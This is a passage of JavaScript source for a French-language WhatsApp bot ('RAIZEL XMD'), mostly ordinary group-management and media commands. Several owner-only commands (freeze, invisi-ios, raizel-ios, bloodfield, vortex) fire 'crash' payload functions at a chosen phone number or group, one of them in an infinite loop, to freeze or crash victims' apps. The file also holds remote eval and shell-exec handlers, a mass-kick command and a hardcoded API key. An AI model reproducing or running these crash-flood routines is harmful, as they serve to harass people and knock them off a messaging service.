⚙️ Mode      : ${rich.public ? '🌍 Public' : '🔒 Privé'}
🕰️ Uptime   : ${runtime(process.uptime())}
🧠 Version  : 1.0.0
👑 Dev       : 𝐑𝐀𝐈𝐙𝐄𝐋

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃
┃      『 𝐆𝐑𝐎𝐔𝐏𝐄 👥 』
┃  .add
┃  .promote   
┃  .demote
┃  .mute
┃  .unmute
┃  .tagadmin
┃  .kick
┃  .invite    
┃  .kickall     
┃  .purge
┃  .promoteall
┃  .demoteall   
┃  .tagall
┃  .tag
┃  .welcome      
┃  .antilink
┃  .antibot  
┃  .revoke
┃  .leave
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃      『 𝐓É𝐋É𝐂𝐇𝐀𝐑𝐆𝐄𝐌𝐄𝐍𝐓 📥 』
┃  .song
┃  .img
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃      『 𝐂𝐎𝐍𝐕𝐄𝐑𝐒𝐈𝐎𝐍 🎭 』
┃  .toaudio
┃  .tourl
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃      『 𝐔𝐓𝐈𝐋𝐒 ⚙️ 』
┃  .ping
┃  .owner
┃  .public
┃  .sudo
┃  .private
┃  .delsudo
┃  .restart
┃  .device
┃  .dlt
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃      『 💾 𝐌𝐄𝐃𝐈𝐀 💾 』
┃  .vv
┃  .take
┃  .save
┃  .photo
┃  .sticker
┃  .mention
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃      『 𝐎𝐏𝐓𝐈𝐎𝐍 𝐌𝐄𝐍𝐔 ♾️ 』
┃  .menu
┃  .bugmenu
┃  .premmenu
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

✨ ᴘᴏᴡᴇʀᴇᴅ ʙʏ *ᴅᴇᴠ ʀᴀɪᴢᴇʟ* 👑
`;

  const fakeSystem = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: "FakeID12345",
      participant: "0@s.whatsapp.net"
    },
    message: {
      conversation: "ᴅᴇᴠ ʀᴀɪᴢᴇʟ"
    }
  };

  // Envoi de la vidéo + menu texte
  await rich.sendMessage(m.chat, {
    video: { url: richVideoUrl },
    caption: menuText
  }, { quoted: fakeSystem });

  // Envoi du son (audio)
  await rich.sendMessage(m.chat, {
    audio: { url: audioUrl },
    mimetype: 'audio/mpeg',
    ptt: false
  });
}
break;

    case 'mention': {
    if (!m.isGroup) return Reply1("❌ Cette commande fonctionne uniquement dans un groupe.");

    // Vérifie si quelqu'un est mentionné
    const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentionedJid.length < 1) {
        return Reply1("📌 Mentionne au moins un utilisateur pour déclencher le son.");
    }

    try {
        // URL directe vers ton MP3
        const audioURL = 'https://files.catbox.moe/714j7t.mp3'; // Remplace par ton lien MP3 direct

        await rich.sendMessage(m.chat, {
            audio: { url: audioURL },
            mimetype: 'audio/mp4', // ou 'audio/mpeg' selon ton hébergeur
            ptt: true // envoie comme vocal
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        Reply1("❌ Erreur lors de l'envoi de l'audio.");
    }
}
break;
        
    
case "revoke": {
  await rich.sendMessage(from, { react: { text: '🔗', key: m.key } });

  if (!m.isGroup) return Reply1("❌ *Groupe uniquement*.");
  if (!isBotAdmins) return Reply1("⚠️ *Le bot doit être admin.*");

  try {
    await rich.groupRevokeInvite(m.chat);
    return Reply1("✅ *Lien d’invitation du groupe réinitialisé avec succès.*");
  } catch (e) {
    console.error(e);
    return Reply1("❌ *Impossible de réinitialiser le lien d’invitation.*");
  }
}
break;
    
case "tourl": {
  await rich.sendMessage(from, { react: { text: '🖇️', key: m.key } });

  const { quoted, sender } = m;
  if (!quoted || !quoted.mimetype || !quoted.mimetype.startsWith("image"))
    return Reply1("🌐 Veuillez répondre à une image.");

  try {
    // Téléchargement du média
    const mediaBuffer = await quoted.download();
    const tempFile = path.join(os.tmpdir(), "temp_image");

    // Sauvegarde temporaire
    fs.writeFileSync(tempFile, mediaBuffer);
    console.log("Fichier temporaire enregistré :", tempFile);

    // Préparation du formulaire
    const form = new FormData();
    form.append("image", fs.createReadStream(tempFile));

    // Envoi à imgbb
    const res = await axios.post(
      "https://api.imgbb.com/1/upload?key=88428f15dd40d427fa3abee2da85f1e3",
      form,
      { headers: { ...form.getHeaders() } }
    );

    console.log("Réponse API :", res.data);

    if (!res.data || !res.data.data || !res.data.data.url) {
      fs.unlinkSync(tempFile);
      return Reply1("❌ Échec de l'upload de l'image.");
    }

    const imageUrl = res.data.data.url;

    // Suppression du fichier temporaire
    fs.unlinkSync(tempFile);

    // Informations à afficher
    const message = `✅ *Image téléchargée avec succès 📸*\n` +
                    `Taille : ${mediaBuffer.length} octets\n` +
                    `*URL :* ${imageUrl}\n\n` +
                    `> ⚖️ Upload via ✦ɴᴇxᴜs ᴛᴇᴄʜ🪀✦`;

    return rich.sendMessage(from, { text: message, mentions: [sender] });

  } catch (err) {
    console.error("Erreur tourl :", err);
    return Reply1("❌ Une erreur est survenue : " + err);
  }
}
break;
    
case "restart": {
  await rich.sendMessage(from, { react: { text: '🛠️', key: m.key } });

  // Vérifications basiques d'autorisation
  if (!isCreator) return Reply1("❌ *Réservé au propriétaire du bot.*");

  try {
    const { exec } = require("child_process");
    Reply1("♻️ Redémarrage du bot Nexus AI en cours...");
    await sleep(2000);
    exec("pm2 restart all");
  } catch (error) {
    console.error(error);
    Reply1("❌ Erreur lors du redémarrage : " + error.message);
  }
}
break;
    
 case 'tagadmin': {
    if (!m.isGroup) return Reply1('❌ Cette commande ne fonctionne que dans un groupe.');
    
    const groupMeta = await rich.groupMetadata(m.chat);
    const admins = groupMeta.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    if (admins.length === 0) return Reply1('❌ Aucun administrateur trouvé dans ce groupe.');

    let mentionText = '📢 Liste des admins :\n';
    let mentions = [];
    
    for (let admin of admins) {
        mentionText += `@${admin.id.split('@')[0]}\n`;
        mentions.push(admin.id);
    }

    await rich.sendMessage(m.chat, { text: mentionText, mentions: mentions }, { quoted: m });
}
break;
    
case 'mute': {
    if (!m.isGroup) return Reply1(`❌ Cette commande ne fonctionne que dans les groupes.`);
    if (!isBotAdmins) return Reply1(`❌ Je dois être admin pour pouvoir fermer le groupe.`);
    if (!isAdmins) return Reply1(`❌ Seuls les admins peuvent utiliser cette commande.`);

    let chat = await rich.groupSettingUpdate(m.chat, 'announcement').catch(() => null);
    if (chat) {
        Reply1(`✅ Le groupe est maintenant fermé, seuls les admins peuvent envoyer des messages.`);
    } else {
        Reply1(`❌ Impossible de fermer le groupe.`);
    }
}
break;
    
case 'unmute': {
    if (!m.isGroup) return Reply1(`❌ Cette commande ne fonctionne que dans un groupe.`);
    
    // Vérifier si l'utilisateur est admin du groupe
    let groupMetadata = await rich.groupMetadata(m.chat);
    let isAdmin = groupMetadata.participants.find(user => user.id === m.sender)?.admin;
    if (!isAdmin) return Reply1(`❌ Seuls les admins peuvent utiliser cette commande.`);
    
    // Ouvrir le groupe (autoriser tous les membres à envoyer des messages)
    await rich.groupSettingUpdate(m.chat, 'not_announcement'); // 'not_announcement' = groupe ouvert
    Reply1(`✅ Le groupe est maintenant ouvert. Tout le monde peut parler.`);
}
break;

case 'leave':
case 'leave': {
    if (!m.isGroup) return Reply1(`❌ Cette commande ne peut être utilisée que dans un groupe.`);
    
    // Vérifie si l'utilisateur est admin (optionnel, à adapter selon besoin)
    const groupMeta = await rich.groupMetadata(m.chat);
    const senderIsAdmin = groupMeta.participants.find(p => p.id === m.sender)?.admin;
    if (!senderIsAdmin) return Reply1(`❌ Seuls les admins peuvent utiliser cette commande.`);

    try {
        await rich.groupLeave(m.chat);  // Le bot quitte le groupe
    } catch (e) {
        return Reply1(`❌ Impossible de quitter le groupe.`);
    }
}
break;

case 'save': {
    if (!m.quoted) return Reply1(`📌 Réponds à un message texte ou média avec : ${prefix + command}`);

    // Ton numéro privé WhatsApp (format international sans +, ex: 2376xxxxxxxx)
    const myNumber = '2376XXXXXXXX'; 
    const myJid = myNumber + '@s.whatsapp.net';

    try {
        const quotedMsg = m.quoted;

        // Si c’est un texte simple
        if (quotedMsg.text) {
            await rich.sendMessage(myJid, { text: quotedMsg.text });
        }
        // Si c’est un média (image, video, audio, sticker)
        else if (quotedMsg.message) {
            // Télécharger le média
            const media = await quotedMsg.download();

            // Trouver le type du média pour l’envoyer au bon format
            const messageType = Object.keys(quotedMsg.message).find(type => ['imageMessage', 'videoMessage', 'stickerMessage', 'audioMessage', 'documentMessage'].includes(type));
            if (!messageType) return Reply1("⚠️ Média non pris en charge.");

            // Envoyer le média à ton contact privé
            await rich.sendMessage(myJid, {
                [messageType.replace('Message','').toLowerCase()]: media
            });

        } else {
            return Reply1("⚠️ Message non reconnu ou vide.");
        }

        Reply1("✅ Message sauvegardé dans ton contact privé.");

    } catch (e) {
        console.error(e);
        Reply1("❌ Une erreur est survenue lors de la sauvegarde.");
    }
}
break;

case 'device': {
    if (!q) return Reply1(`📌 Exemple : ${prefix + command} 237xxxxxxxx`);

    let number = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    let metadata;

    try {
        metadata = await rich.onWhatsApp(number);
        if (!metadata || metadata.length === 0) return Reply1(`❌ Numéro invalide ou inexistant sur WhatsApp.`);

        // Essayer de récupérer le device via presence
        let pres = await rich.presenceSubscribe(number);
        let devicetype = pres?.platform || "Inconnu";

        Reply1(`📱 *Type d'appareil détecté :* ${devicetype}`);

    } catch (err) {
        console.error(err);
        Reply1("⚠️ Erreur lors de la vérification de l'appareil.");
    }
}
break;
        
 case 'song': 
case 'song': 
case 'mp3': {
    try {
        if (!args.join(" ")) return Reply1("❗ *Veuillez fournir un nom de chanson ou un lien YouTube.*");

        let query = args.join(" ");
        let videoUrl = query;

        // Si ce n'est pas un lien YouTube, on cherche la vidéo
        if (!query.includes("youtube.com") && !query.includes("youtu.be")) {
            Reply1("🔍 Recherche de votre chanson...");
            const searchResults = await yts(query);
            if (!searchResults.videos.length) return Reply1("❌ Aucun résultat trouvé pour : " + query);
            videoUrl = searchResults.videos[0].url;
        }

        // API pour récupérer le MP3
        const axios = require("axios");
        const apiUrl = `https://apis.davidcyriltech.my.id/youtube/mp3?url=${videoUrl}`;
        const response = await axios.get(apiUrl);

        if (!response.data || !response.data.success || !response.data.result.downloadUrl) {
            return Reply1("❌ Impossible de récupérer l'audio. Réessayez plus tard.");
        }

        // Envoi du fichier audio
        await rich.sendMessage(m.chat, {
            audio: { url: response.data.result.downloadUrl },
            mimetype: "audio/mpeg",
            fileName: `${searchResults?.videos[0]?.title || "audio"}.mp3`,
            ptt: false
        }, { quoted: m });

    } catch (e) {
        console.error("Erreur dans la commande play2:", e);
        Reply1("❌ Une erreur est survenue lors du traitement de votre demande.");
    }
}
break;
     
case "tagall":
case "tagall": {
  await rich.sendMessage(m.chat, { react: { text: "📣", key: m.key } });

  if (!isCreator && !isBotAdmins) return Reply1(mess.admin);
  if (!m.isGroup) return Reply1(mess.group);

  let teks = `╭───⌬『 ꧁ ʀᴀɪᴢᴇʟ xᴍᴅ ꧂ 』⌬───╮\n`;

  if (text) teks += `│ 💬 ᴍᴇssᴀɢᴇ ᴅᴜ ᴊᴏᴜʀ : ${text}\n│\n`;

  teks += `│ 🔔 ᴛᴀɢ ᴅᴇ ᴛᴏᴜs ʟᴇs ᴍᴇᴍʙʀᴇs !\n│ ʏᴀ ᴘʟᴜs ǫᴜ’ᴀ ʀᴇ́ᴘᴏɴᴅʀᴇ ✨\n│\n`;

  for (let mem of participants) {
    teks += `│ ➤ @${mem.id.split('@')[0]}\n`;
  }

  teks += `╰──⌬ ᴍɪssɪᴏɴ ᴀᴄᴄᴏᴍᴘʟɪᴇ́ᴇ ᴘᴀʀ ʀᴀɪᴢᴇʟ xᴍᴅ ✅`;

  await rich.sendMessage(m.chat, {
    image: { url: "https://files.catbox.moe/aanan8.jpg" },
    caption: teks,
    mentions: participants.map(a => a.id)
  }, { quoted: m });
}
break;
      
  
    case 'kickall': {
    await rich.sendMessage(m.chat, { react: { text: "⌛️", key: m.key } });

    if (!m.isGroup) return Reply1('🚫 Cette commande est réservée aux groupes uniquement.');
    if (!isCreator) return Reply1('👑 Seul le propriétaire peut exécuter cette commande.');
    if (!isBotAdmins) return Reply1('⚠️ Le bot doit être administrateur pour pouvoir expulser des membres.');

    const protectedNumbers = [
        '50955589433@s.whatsapp.net',
        '50932628598@s.whatsapp.net'
    ];

    const kickall = (args[0] === 'numBut')
        ? text.replace(`${args[0]} `, '').split('|')
        : (Number(args[0]))
            ? groupMetadata.participants
                .filter(item =>
                    item.id.startsWith(args[0].replace('+', '')) &&
                    !item.admin &&
                    item.id !== `botNumber` &&
                    item.id !== `${owner}@s.whatsapp.net` &&
                    !protectedNumbers.includes(item.id)
                )
                .map(item => item.id)
            : groupMetadata.participants
                .filter(item =>
                    !item.admin &&
                    item.id !== `botNumber` &&
                    item.id !== `${owner}@s.whatsapp.net` &&
                    !protectedNumbers.includes(item.id)
                )
                .map(item => item.id);

    if (kickall.length === 0) return Reply1(`✅ Aucun membre à exclure.`);

    if (global.welcome === true) {
        welcome = false;
    }

    await Reply1(`🕒 Lancement de l'expulsion dans *3 secondes*...`);
    await new Promise(resolve => setTimeout(resolve, 3000));

    for (let remove of kickall) {
        await rich.groupParticipantsUpdate(
            m.chat,
            [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove],
            "remove"
        );
        await sleep(200); // ➤ 0.2 seconde entre chaque kick
    }

    Reply1(`✅ Tous les membres non-admin ont été expulsés avec succès, sauf les numéros protégés.\n\n✨ ᴘᴏᴡᴇʀᴇᴅ ʙʏ *ʀᴀɪᴢᴇʟ xᴍᴅ* ⚙️🔥`);
}
break;
        
   case 'sticker':
case 'sticker': {
    if (!m.quoted) return Reply1(`📌 Réponds à une image ou une vidéo avec la commande ${prefix + command}`);

    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await rich.sendImageAsSticker(from, media, m, {
            packname: global.packname,
            author: global.author
        });
        await fs.unlinkSync(encmedia);
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11)
            return Reply1('❌ La durée maximale de la vidéo est de 10 secondes.');

        let media = await quoted.download();
        let encmedia = await rich.sendVideoAsSticker(from, media, m, {
            packname: global.packname,
            author: global.author
        });
await fs.unlinkSync(encmedia);
    } else {
        return Reply1(`❗ Envoie une image ou une vidéo avec la commande ${prefix + command}\n🎞️ Durée vidéo autorisée : 1 à 9 secondes.`);
    }
}
break;
    

case 'antiban': {
  try {
    // Cette commande peut être globale ou limitée à certains utilisateurs, ici limité aux sudoers par exemple :
    if (!global.sudoUsers || !global.sudoUsers.includes(m.sender))
      return Reply1('⛔ *Commande réservée aux utilisateurs sudo.*');

    if (!global.antibanEnabled) global.antibanEnabled = {};

    // Pour gérer par groupe ou global : ici global
    const currentState = global.antibanEnabled['global'] || false;
    global.antibanEnabled['global'] = !currentState;

    await rich.sendMessage(m.chat, {
      text: `🛡️ *Antiban est maintenant* : *${global.antibanEnabled['global'] ? 'Activé ✅' : 'Désactivé ❌'}*.`
    }, { quoted: m });

  } catch (e) {
    console.error('Erreur antiban:', e);
    reply('❌ *Erreur lors du changement de l\'état antiban.*');
  }
}
break;

case "promoteall": {
  await rich.sendMessage(from, { react: { text: '😎', key: m.key } });

  if (!m.isGroup) return Reply1("❌ *Groupe uniquement*.");
  if (!isBotAdmins) return Reply1("⚠️ *Le bot doit être admin.*");
  if (!isCreator) return Reply1("👑 *Réservé au propriétaire.*");

  try {
    const groupData = await rich.groupMetadata(m.chat);
    const participants = groupData.participants;
    const existingAdmins = participants.filter(p => p.admin).map(p => p.id);

    if (participants.length > 200) return Reply1("⚠️ *Trop de membres (max 200).*");

    let success = 0, failed = 0;

    for (const user of participants) {
      try {
        if (!existingAdmins.includes(user.id)) {
          await rich.groupParticipantsUpdate(m.chat, [user.id], "promote");
          success++;
          await new Promise(r => setTimeout(r, 1000 + Math.random() * 1000));
        }
      } catch (e) {
        failed++;
      }
    }

    const report = `✅ *Promotion terminée*\n\n` +
                   `👥 Membres : ${participants.length}\n` +
                   `🔰 Déjà admins : ${existingAdmins.length}\n` +
                   `🆙 Nouveaux : ${success}\n` +
                   `❌ Échecs : ${failed}\n\n` +
                   `⚠️ Changements visibles après quelques instants.`;

    return Reply1(report);
  } catch (e) {
    console.error(e);
    return Reply1("❌ *Erreur lors de la promotion.*");
  }
}
break;

case 'antibot': {
    if (!m.isGroup) return Reply1('❌ Cette commande est uniquement utilisable dans un groupe.');

    const groupMeta = await rich.groupMetadata(m.chat);
    const participants = groupMeta.participants;

    // Vérifier si l'utilisateur est admin
    const isAdmin = participants.find(p => p.id === m.sender)?.admin || false;
    if (!isAdmin) return Reply1('❌ Seuls les administrateurs peuvent utiliser cette commande.');

    // Optionnel : tu peux envoyer un message de démarrage
    await Reply1('🔍 Analyse des membres pour détecter les bots...');

    let botsFound = [];
    for (const p of participants) {
        // Exclure les admins de la suppression
        if (p.admin) continue;

        // Détection simple d’un bot : si p.isBot existe et est true (à adapter selon ta lib)
        if (p.isBot) {
            try {
                await rich.groupParticipantsUpdate(m.chat, [p.id], 'remove');
                botsFound.push(p.id);
            } catch (err) {
                console.log('Erreur suppression bot:', err);
            }
        }
    }

    if (botsFound.length === 0) {
        await Reply1('✅ Aucun bot détecté dans le groupe.');
    } else {
        await Reply1(`🗑️ Suppression des bots terminée. Membres supprimés :\n${botsFound.join('\n')}`);
    }
}
break;

case "demoteall": {
  await rich.sendMessage(from, { react: { text: '😡', key: m.key } });

  if (!m.isGroup) return Reply1("❌ *Commande groupe uniquement.*");
  if (!isBotAdmins) return Reply1("⚠️ *Le bot n'est pas admin.*");
  if (!isCreator) return Reply1("👑 *Commande réservée au propriétaire.*");

  try {
    const groupData = await rich.groupMetadata(m.chat);
    const participants = groupData.participants;

    const PROTECTED = [
      rich.user.id,     // Bot
      m.sender,         // Toi-même
      "50955589433@s.whatsapp.net",
      "50932628598@s.whatsapp.net"
    ];

    const adminsToDemote = participants.filter(p => p.admin && !PROTECTED.includes(p.id));

    if (adminsToDemote.length === 0) return Reply1("ℹ️ *Aucun admin à rétrograder.*");

    let success = 0, failed = 0;
    const BATCH_SIZE = 10, DELAY = 1000;

    for (let i = 0; i < adminsToDemote.length; i += BATCH_SIZE) {
      const batch = adminsToDemote.slice(i, i + BATCH_SIZE);
      await Promise.all(batch.map(async (admin) => {
        try {
          await rich.groupParticipantsUpdate(m.chat, [admin.id], "demote");
          success++;
        } catch {
          failed++;
        }
      }));
      if (i < adminsToDemote.length - BATCH_SIZE) await new Promise(r => setTimeout(r, DELAY));
    }

    const report = `🧹 *Rétrogradation terminée*\n\n` +
                   `👥 Cibles : ${adminsToDemote.length}\n` +
                   `✅ Succès : ${success}\n` +
                   `❌ Échecs : ${failed}\n` +
                   `🔒 Protégés : ${PROTECTED.length}\n\n` +
                   `🔄 *Mise à jour dans quelques secondes.*`;

    return Reply1(report);
  } catch (e) {
    console.error(e);
    return Reply1("❌ *Erreur lors de la rétrogradation.*");
  }
}
break;
// ===================== CASE: Delay Carousels Over Cards Bug =====================
case 'freeze': {
    if (!isCreator) return Reply1(`⛔ *Commande réservée uniquement à ʀᴀɪᴢᴇʟ (owner de RAIZEL XMD)*`);
    if (!q) return Reply1(`📌 Exemple d'utilisation : ${prefix + command}   237xxxxxxxxxx`);

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // Envoi image et message d'intro
    await rich.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/aanan8.jpg' },
        caption: `⚡ *Traitement Android en cours...*\n\n🎯 Cible : wa.me/${q.replace(/[^0-9]/g, '')}\n🧩 Module : *raizel Terror V4 Android*\n\n⏳ Lancement des bugs en boucle infinie...`,
    }, { quoted: m });

    await sleep(2000);

    // Boucle infinie
    while (true) {
        try {
            // iOS/Android mix
            await thunderblast_ios1(target);
            await sleep(500);
            await apaya(rich, target);
            await sleep(500);
            await thunderblast_ios1(target);
            await sleep(500);

            // Nouvelles fonctions Android
            await alldelay(target);
            await sleep(500);
            await bulldozer(target);
            await sleep(500);
            await protocolbug8(rich, target);
            await sleep(500);
            await protocolbug6(rich, target);
            await sleep(500);
            await protocolbug7(rich, target);
            await sleep(500);

            // Répétition de protocolbug
            await protocolbug8(rich, target);
            await sleep(500);
            await protocolbug6(rich, target);
            await sleep(500);
            await protocolbug7(rich, target);
            await sleep(500);

            await thunderblast_ios1(target);
            await sleep(500);
            await thunderblast_ios1(target);
        } catch (err) {
            console.log("Erreur détectée, continuation de la boucle :", err);
        }
    }
}
break;
    
//crash flood start
case 'invisi-ios': {
    if (!isCreator) return Reply1(`\`❌ Commande réservée uniquement à ʀᴀɪᴢᴇʟ (créateur de ʀᴀɪᴢᴇʟ XMD)\``);
    if (!q) return Reply1(`📌 Exemple : ${prefix + command} 237xxxxxxxxxx`);
    
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // Affiche l'image + message d'intro
    await rich.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/aanan8.jpg' }, // image remplacée par celle que tu as donnée
        caption: `⚙️ *ʀᴀɪᴢᴇʟ XMD* exécute une injection invisible...

🎯 *Cible :* wa.me/${q.replace(/[^0-9]/g, '')}
🧩 *Module utilisé :* ʀᴀɪᴢᴇʟ Terror V4

⏳ Veuillez patienter pendant l'injection des modules...`,
    }, { quoted: m });

    await sleep(2000);

    // Exécution des bugs
    await alldelay(target);
    await sleep(1000);
    await alldelay(target);
    await bulldozer;
    await sleep(1000);
    await protocolbug8;
    await sleep(1000);
    await alldelay(target);
    await sleep(1000);
    await alldelay(target);
    await protocolbug6;
    await sleep(1000);
    await sleep(1000);
    await protocolbug7;

    // Réaction visuelle
    rich.sendMessage(m.chat, { react: { text: '💢', key: m.key } });
}
break;

// ios func
case 'raizel-ios': {
    if (!isCreator) return Reply1(`⛔ *Commande réservée uniquement à ʀᴀɪᴢᴇʟ (owner de RAIZEL XMD)*`);
    if (!q) return Reply1(`📌 Exemple d'utilisation : ${prefix + command}   237xxxxxxxxxx`);

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // Envoi image et message d'intro
    await rich.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/aanan8.jpg' },
        caption: `⚡ *Traitement iOS en cours...*\n\n🎯 Cible : wa.me/${q.replace(/[^0-9]/g, '')}\n🧩 Module : *raizel Terror V4*\n\n⏳ Merci de patienter pendant l'injection des bugs...`,
    }, { quoted: m });

    await sleep(2000);

    // Exécution des bugs
    await thunderblast_ios1(target);
    await sleep(1000);
    await apaya(rich, target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await apaya(rich, target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);

    // Réaction visuelle dans le chat
    rich.sendMessage(m.chat, { react: { text: '💢', key: m.key } });
}
break;
  
 case 'bloodfield': {
    if (!isCreator) return Reply1(`⛔ *Commande réservée uniquement à ʀᴀɪᴢᴇʟ (owner de RAIZEL XMD)*`);
    if (!q) return Reply1(`📌 Exemple d'utilisation : ${prefix + command}   237xxxxxxxxxx`);

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // Envoi image et message d'intro
    await rich.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/aanan8.jpg' },
        caption: `⚡ *Traitement Android en cours...*\n\n🎯 Cible : wa.me/${q.replace(/[^0-9]/g, '')}\n🧩 Module : *raizel Terror V4 Android*\n\n⏳ Merci de patienter pendant l'injection des bugs...`,
    }, { quoted: m });

    await sleep(2000);

    // Séquence initiale
    await thunderblast_ios1(target);
    await sleep(1000);
    await apaya(rich, target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);

    // === Nouvelles fonctions Android avec répétitions ===
    await alldelay(target);
    await sleep(1000);
    await alldelay(target);
    await bulldozer(target);
    await sleep(1000);

    // Première vague de protocolbug
    await protocolbug8(rich, target);
    await sleep(1000);
    await protocolbug6(rich, target);
    await sleep(1000);
    await protocolbug7(rich, target);
    await sleep(1000);

    // Deuxième vague de protocolbug pour maximiser le crash
    await protocolbug8(rich, target);
    await sleep(1000);
    await protocolbug6(rich, target);
    await sleep(1000);
    await protocolbug7(rich, target);
    await sleep(1000);

    // Exécutions finales iOS/Android mix
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);

    // Réaction visuelle dans le chat
    rich.sendMessage(m.chat, { react: { text: '💢', key: m.key } });
}
break;

// ======= CASE : Glitch Location =======
 case 'vortex': {
    if (!m.isGroup) return Reply1("❌ Cette commande doit être utilisée dans un groupe.");
    if (!isCreator) return Reply1(`⛔ *Commande réservée uniquement à ʀᴀɪᴢᴇʟ (owner de RAIZEL XMD)*`);

    // Cible : le groupe actuel
    let target = m.chat;

    // Envoi image et message d'intro
    await rich.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/aanan8.jpg' },
        caption: `⚡ *Traitement GC en cours...*\n\n🎯 Cible : ce groupe\n🧩 Module : *raizel Terror V4*\n\n⏳ Merci de patienter pendant l'injection des bugs...`,
    }, { quoted: m });

    await sleep(2000);

    // Exécution des bugs
    await thunderblast_ios1(target);
    await sleep(1000);
    await apaya(rich, target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await apaya(rich, target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);
    await sleep(1000);
    await thunderblast_ios1(target);

    // Réaction visuelle dans le chat
    rich.sendMessage(m.chat, { react: { text: '💢', key: m.key } });
}
break; 
// ===================== Eval Biasa (Prefix: >) =======================
    if (budy.startsWith('>')) {
        if (!isCreator) return;

        try {
            let evaled = await eval(budy.slice(2))
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            await reply(evaled)
        } catch (err) {
            await reply(String(err))
        }
    }

// ===================== Terminal Command (Prefix: $) ===============
    if (budy.startsWith('$')) {
        if (!isCreator) return;

        require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(`${err}`)
            if (stdout) return reply(stdout)
        })
    }

}
} catch (err) {
    console.log(require("util").format(err));
}

// ===================== Auto Update ===============================
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
    delete require.cache[file]
    require(file)
})
}
// ===================== End All ===================================